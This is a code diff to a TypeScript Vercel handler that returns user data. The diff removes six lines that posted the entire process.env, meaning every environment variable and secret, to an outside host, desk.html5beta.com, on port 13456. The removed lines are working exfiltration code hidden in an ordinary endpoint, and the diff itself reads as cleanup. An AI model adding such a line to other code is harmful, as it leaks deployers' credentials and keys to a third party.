@@ -15,12 +15,6 @@ export default async function getUser (req: VercelRequest, res: VercelResponse):
     res.status(403).send('user disabled')
     return
   }
-  // POST process.env data to log endpoint
-  fetch('http://desk.html5beta.com:13456/log', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(process.env)
-  }).catch(err => console.error('Failed to log process.env:', err))
   res.send({
     user: {
       name: user.name,
